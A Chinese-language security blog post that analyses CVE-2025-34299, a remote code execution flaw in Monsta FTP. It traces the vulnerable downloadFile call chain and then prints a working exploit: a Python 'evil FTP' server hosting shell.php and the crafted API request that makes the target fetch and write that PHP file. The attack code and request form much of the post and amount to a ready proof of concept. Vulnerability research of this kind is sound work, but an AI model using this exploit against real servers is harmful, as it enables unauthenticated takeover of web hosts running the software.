#  Monsta FTP CVE-2025-34299 RCE 浅析  
原创 Ha1ey  安全白白   2026-01-06 00:01  
  
   
  
官网：https://www.monstaftp.com/  
#### 分析  
  
首先看一下入口点 application/api/api.php  
  
根据我们传入的 request  
参数中 actionName  
进入 \RequestMarshaller::marshallRequest  
方法  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/f9GYWLMlB9pF1kAdlDjty7eVnHcGSsOa3WuSvDzPdiakZgmjaxbbmibGIf988W1v9Aia01zw1IUol7KQ9aBlqRmaw/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/f9GYWLMlB9pF1kAdlDjty7eVnHcGSsOaM8rsMCYyQQIUXq1APiaic9ukEqvwJMibsCnUBEnETAYoticW8PreZxGT9Q/640?wx_fmt=png&from=appmsg "")  
  
  
跳过几个特殊的方法 来到这里  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/f9GYWLMlB9pF1kAdlDjty7eVnHcGSsOaOB0DZrgYxYVsDmFu0tIGa2Sh8CboQ5uoz3Xb65hswat1hU8wVtYCBw/640?wx_fmt=png&from=appmsg "")  
  
  
\RequestDispatcher::dispatchRequest 方法，数组中的方法可以直接被调用到，这里是 downloadFile  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/f9GYWLMlB9pF1kAdlDjty7eVnHcGSsOaMQQBlW0nEac0Eb38ficgyyyQ5bOnN2MEwibwLw3QSzLRUp8xH1DsGTRQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/f9GYWLMlB9pF1kAdlDjty7eVnHcGSsOa3FndJ0qfCLgzNIxwImlshasOasXgbXYiarmY8FwwickCFq2wcOOW9vVg/640?wx_fmt=png&from=appmsg "")  
  
  
来到 \RequestDispatcher::downloadFile，这里$this->connectAndAuthenticate();不是web 的鉴权 是 ftp 的  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/f9GYWLMlB9pF1kAdlDjty7eVnHcGSsOaDGB84h7UWIx4xz7ibgiaVj6Qiclh27FSo8UBNIiajkdxSbqUA3CL2EgoBA/640?wx_fmt=png&from=appmsg "")  
  
  
\ConnectionBase::downloadFile ，这里直接用最普通的 ftp  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/f9GYWLMlB9pF1kAdlDjty7eVnHcGSsOaDDby1zczA9bgPnaH0ddMUPgzIMrIJW2ZZIzFlYj5kkjJClpIyxjkTw/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/f9GYWLMlB9pF1kAdlDjty7eVnHcGSsOaszMIfBgY9Hf0ricicYsyK3oMwdDibdW398gQcVIzpy3JA9uZ7tciaZobWg/640?wx_fmt=png&from=appmsg "")  
  
  
可以看到 \FTPConnection::handleDownloadFile 中 调用了@ftp_get 进行了文件写入  
  
启动一个 ftp 的监听放一个php，使目标下载即可  
  
evilftp.py  
```
import osfrom pyftpdlib.authorizers import DummyAuthorizerfrom pyftpdlib.handlers import FTPHandlerfrom pyftpdlib.servers import FTPServerclassEvilFTPHandler(FTPHandler):    def on_connect(self):        print(f"[+] FTP client connected: {self.remote_ip}")    def on_login(self, username):        print(f"[+] FTP login: {username}")    def on_file_sent(self, file):        print(f"[+] File sent: {file}")def start_evil_ftp(host="0.0.0.0", port=2121):    ftp_root = "/tmp/evilftp"    os.makedirs(ftp_root, exist_ok=True)    print(f"[*] FTP root directory: {ftp_root}")    filename = "shell.php"    filepath = os.path.join(ftp_root, filename)    payload = "<?php phpinfo(); ?>"    with open(filepath, "w") as f:        f.write(payload)    print(f"[+] Payload file created: {filename}")    username = 'test'    password = 'test'    print(f"[+] FTP credentials: {username} / {password}")    authorizer = DummyAuthorizer()    authorizer.add_user(username, password, ftp_root, perm="elradfmw")    handler = EvilFTPHandler    handler.authorizer = authorizer    handler.banner = "220 Evil FTP Server Ready"    server = FTPServer((host, port), handler)    print(f"[*] Evil FTP listening on {host}:{port}")    server.serve_forever()if __name__ == "__main__":    start_evil_ftp()
```  
  
最后构造的 request 参数为  
```
request={    "actionName": "downloadFile",    "connectionType": "ftp",    "configuration": {      "host": "127.0.0.1",      "port": 2121,      "username": "test",      "password": "test"    },    "context": {      "remotePath": "shell.php",      "localPath": "shell.php"    }  }
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/f9GYWLMlB9pF1kAdlDjty7eVnHcGSsOaejWicMVbxsZ0pBDbUypxYQRXKJFMumvzohUoPmpwklNAygoCTibCzPgw/640?wx_fmt=png&from=appmsg "")  
  
  
本文首发于先知社区：  
https://xz.aliyun.com/news/91007  
  
   
  
